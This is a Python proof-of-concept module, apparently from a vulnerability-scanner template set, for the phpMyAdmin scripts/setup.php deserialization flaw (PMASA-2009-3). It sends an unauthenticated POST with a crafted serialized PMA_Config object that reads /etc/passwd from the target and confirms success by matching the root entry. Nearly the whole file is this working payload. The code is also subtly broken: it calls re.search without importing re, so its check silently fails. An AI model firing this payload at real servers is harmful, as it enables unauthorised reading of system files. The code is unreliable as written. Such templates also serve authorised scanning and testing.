import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''PhpMyAdmin Scripts/setup.php Deserialization Vulnerability''',
        "description": '''Setup script used to create PhpMyAdmin configurations can be fooled by using a crafted POST request to include arbitrary PHP code in the generated configuration file. Combined with the ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code.''',
        "severity": "high",
        "references": [
            "https://www.phpmyadmin.net/security/PMASA-2009-3/", 
            "https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2009", "phpmyadmin", "rce", "deserialization"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/scripts/setup.php"""
        method = "POST"
        data = """action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}"""
        headers = {'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and (re.search(r"""root:.*:0:0:""",resp0.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url